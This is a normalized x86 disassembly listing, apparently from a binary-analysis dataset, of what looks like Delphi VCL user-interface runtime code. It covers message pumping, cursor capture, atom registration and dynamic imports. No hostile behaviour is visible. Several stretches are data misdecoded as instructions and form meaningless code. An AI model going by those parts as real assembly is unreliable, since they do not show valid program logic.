mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_473964
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_45c380
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_4560f4
jmp r-xdata
sub_460b84
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403550
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_460cf8
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_460c14
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_460cd0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_460c78
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_460ca8
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406d88
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_460cd0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_460c44
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_460cf8
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_460c5c
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_460c78
pop ebx
retn
mov eax ebx
call sub_460ca8
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_460d5c
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_460ec2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_460fe0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_460fc4
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_460fc4
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_4610d0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4031ec
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4031ec
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_4031ec
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_4031ec
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f7c
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f7c
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_461158
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4612d0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_409070
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403fd0
mov eax [ rw-data ]
call sub_40443c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_409070
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fd0
mov eax [ rw-data ]
call sub_40443c
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_40443c
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419030
mov [ rw-data ] eax
call sub_460d5c
mov dl 0x1
mov eax [ r-xdata ]
call sub_460b84
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_473240
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_474324
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_475f0c
mov ecx r-xdata
mov edx sub_452b08
mov eax [ r-xdata ]
call sub_418584
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4612d7
lea eax [ ebp - 0x10 ]
call sub_403f7c
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_461340
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46139f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4613a6
retn
mov eax rw-data
call sub_40d538
call sub_4610d0
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a04
mov eax rw-data
call sub_403f7c
mov eax rw-data
call sub_403f7c
sub_4613a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46142e
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461435
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_461158
mov eax [ r-xdata ]
call sub_4183f8
mov eax [ r-xdata ]
call sub_418498
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
sub_4615e4
stc
push ebx
push eax
inc [ eax + 0x1c ]
inc esi
add [ eax - 0x73ffb9e4 ] cl
push ds
inc esi
add [ esi + ebx + 0x54110046 ] ch
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb [ esi ] al
je r-xdata
inc ebx
jne r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x53 ] cl
inc ecx
add [ esp + edx * 4 - 0x5f1bffbf ] bh
inc ecx
dec eax
xor al 0x40
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
inc esi
add [ edx + ebx + 0x42 ] bl
add [ eax + 0x34 ] al
inc eax
inc esi
add [ eax ] al
add [ eax ] al
xor [ eax ] bl
inc esi
add [ eax + ebx + 0x46 ] dh
dec esp
imul esi [ ebx + 0x74 ] 0x1730c08b
inc esi
add [ edi ] al
or eax 0x6f685354
jb r-xdata
add ah bl
lahf
inc ecx
add al dh
scasd [ edi ]
inc ecx
add [ eax + esi * 4 ] ah
inc ecx
add [ eax ] ch
mov al 0x41
add [ eax + esi * 4 ] ch
inc ecx
add al cl
mov [ 0xffffffffb1a00041 ] eax
inc ecx
add ah bh
mov cl 0x41
add al dl
mov dl 0x41
add [ ebx + ebp * 4 ] dl
inc ecx
add [ ebx + esi * 4 ] cl
inc ecx
add [ eax - 0x6bffbe4d ] al
inc esi
add [ eax + 0x240041ad ] dh
lahf
inc ecx
add [ esi + ebp * 4 + 0x41 ] cl
add [ esi + ebp * 4 - 0x5107ffbf ] cl
inc ecx
add [ ebx + 0x41 ] dh
add [ eax + 0x80041b0 ] cl
cmpsb [ esi ] [ edi ]
inc ecx
add ah bl
cmpsb [ esi ] [ edi ]
inc ecx
add ah al
mov al 0x41
add ah dl
mov al 0x41
add [ eax - 0x59 ] al
inc ecx
add [ edi - 0x57bfffbf ] dl
inc ecx
add al bl
test eax 0xaa300041
inc ecx
add ah al
stosb [ edi ]
inc ecx
add [ esi + ebp * 4 ] dl
inc ecx
add [ eax ] dh
scasb [ edi ]
inc ecx
add [ eax ] ch
mov cl 0x41
add [ eax - 0x51 ] bh
inc ecx
add [ eax ] bh
mov bl 0x41
add [ eax - 0x4d ] cl
inc ecx
add [ 0x6f685354 ] cl
jb r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
push 0x2004175
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x16840000
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
pop ss
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx ] bl
inc esi
add [ eax ] dh
add [ eax ] al
add al bl
imul eax [ ecx ] 0x34
xor al 0x40
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
add [ eax ] al
in al 0x10
inc eax
add [ eax + eax ] bh
add [ edx ] al
add dh ch
adc al 0x46
push edx
sbb [ esi ] al
pushad
sbb [ esi ] al
mov al [ 0x38000000 ]
inc ebx
jne r-xdata
add [ eax + 0x18 ] ah
inc esi
add [ eax + 0x38000000 ] ah
dec esp
imul esi [ ebx + 0x74 ] r-xdata
enter 0x416c 0x0
add [ eax ] al
or [ ecx + 0x63 ] al
je r-xdata
add [ eax + 0x48004213 ] dh
xor al 0x40
pop esp
sbb al [ edx ]
inc eax
xor al 0x40
dec esp
imul esi [ ebx + 0x74 ] 0x17580000
inc esi
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x18 ] dl
inc esi
jbe r-xdata
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] bl
and [ esi ] al
push 0x64004620
push ss
inc edx
add al bl
add [ eax + 0x34 ] cl
inc eax
outsb
je r-xdata
add al [ ecx ]
pop es
dec eax
imul ebp [ esi + 0x74 ] 0x6727453
push ebx
je r-xdata
xchg ebx eax
inc ecx
add [ edi + edx ] bh
inc edx
add [ eax - 0x27ffbde4 ] bl
sbb [ esi ] eax
xor al 0x25
inc esi
add [ edx + ebx + 0x42 ] dh
add [ edi + edx + 0x42 ] bl
add [ edi + edx + 0x42 ] dl
add [ edx + ebx + 0x42 ] bh
add ah al
pop ds
inc esi
add [ eax + 0x1d ] bl
inc edx
add ah bh
sbb al 0x42
add [ eax - 0x3fffbde4 ] dl
sbb al 0x42
add [ esp + ebx + 0x1b2c0042 ] dl
inc esi
add [ ebx + 0x46 ] bl
add ah dh
and al [ esi ]
mov [ esi ] ah
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add [ fs : eax ] al
add ah ah
adc [ eax ] al
js r-xdata
imul ebp [ esi + 0x67 ] 0x61430701
outsb
push ebx
push 0x4207776f
outsd
outsd
insb
popad
outsb
add ah ah
adc [ eax ] al
add [ eax ] dl
inc eax
add ah bl
pop ss
inc esi
add [ eax ] al
add [ eax ] al
sub_461856
out dx eax
inc [ eax - 0x57ffb9db ]
and eax 0x540d0046
inc ebx
jne r-xdata
test [ ecx ] dh
inc eax
add [ eax + 0x48004031 ] ah
sbb eax [ edx ]
inc esp
sbb eax [ edx ]
jl r-xdata
je r-xdata
push ds
inc esi
add al ah
push ds
inc esi
add ah dh
push ds
inc esi
add [ eax ] cl
pop ds
inc esi
add [ edi + ebx ] bl
inc esi
add [ eax ] dh
pop ds
inc esi
add [ edi + ebx + 0x46 ] al
add [ eax + 0x1f ] bl
inc esi
add [ edi + ebx + 0x46 ] ch
add [ eax - 0x6bffb9e1 ] al
pop ds
inc esi
add [ eax - 0x63ffb9e1 ] bl
pop ds
inc esi
add [ eax - 0x5bffb9e1 ] ah
pop ds
inc esi
add [ eax - 0x53ffb9e1 ] ch
pop ds
inc esi
add [ eax - 0x4bffb9e1 ] dh
pop ds
inc esi
add [ eax - 0x43ffb9e1 ] bh
pop ds
inc esi
add al al
pop ds
inc esi
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x49e85653
sbb al 0xfa
dec [ ebx - 0x740f7426 ]
inc esi
pop esp
test eax eax
je r-xdata
inc edx
add ah bl
sbb eax [ edx ]
mov al 0x1b
inc edx
add al ah
sbb eax [ edx ]
add [ ebx ] bl
inc edx
add [ ebx + ebx + 0x1be80042 ] dl
inc edx
add ah cl
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax + 0x1b ] cl
inc edx
add [ ebx + ebx + 0x42 ] al
add [ ebx + ebx + 0x42 ] bh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421c38
test bl bl
jle r-xdata
mov edx esi
call sub_461d7c
add [ ebx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
inc esi
add [ edi ] al
or eax 0x73754354
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
int3
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
fcom [ edi ]
inc esi
add [ edx + 0x30046 ] cl
or [ ecx + 0x63 ] al
je r-xdata
call 0xffffffffcc465b20
imul esi [ ebx + 0x74 ] 0x18e40000
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx + 0x46 ] bl
add [ eax ] bl
add [ eax ] al
add ah cl
jne r-xdata
dec esp
sub_461968
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_421c38
test bl bl
jle r-xdata
mov edx esi
call sub_461d7c
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_4619d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_42174c
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_461a80
sub_461a0c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_46199c
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_418cb4
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_418e40
sub_461a54
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_404388
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403fd0
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_461a80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_461d7c
mov edx ebx
mov eax esi
call sub_461d5c
sub_461aa8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_461a80
sub_461ad4
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_476cd8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_4033e8
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421cc4
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_452934
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_461b2c
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_476d00
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_4033e8
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_421ce0
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_452934
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_461b84
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4212ec
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_461d08
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_461bf0
push ebx
push esi
push edi
call sub_4035b8
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_4031ec
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_418eac
call sub_4031ec
mov eax [ edi + 0x30 ]
call sub_4031ec
mov edx ebx
and dl 0xfc
mov eax edi
call sub_421338
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4035a0
sub_461c40
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_461c88
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418e20
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40339c
mov edx edi
call sub_461a0c
sub_461cd4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_4639e8
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_463a2c
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_4213bc
sub_461d14
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_421608
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_461d7c
sub_461d5c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418c68
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_4213bc
pop esi
pop ebx
retn
sub_461d7c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_418f60
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_461d98
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_461e00
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_46cb60
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_465284
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_462608
mov edx ebp
call sub_4626c0
inc eax
je r-xdata
sub_461e8c
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_461eac
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_461fc4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_421bf4
mov [ esi + 0x6a ] 0x1
mov [ esi + 0x80 ] 0xffffffff
mov [ esi + 0x86 ] 0x1
xor eax eax
mov [ esi + 0x90 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_462018
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
mov eax [ esi + 0x98 ]
call sub_4031ec
mov eax [ esi + 0x9c ]
call sub_4031ec
cmp [ esi + 0x90 ] 0x0
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_461968
test bl bl
jle r-xdata
lea eax [ esi + 0x90 ]
call sub_40d538
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_462068
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4194bc
mov edx [ ebx + 0x64 ]
mov edi esi
mov eax edi
call sub_462114
mov dl [ ebx + 0x69 ]
mov eax edi
call sub_462174
mov dl [ ebx + 0x6a ]
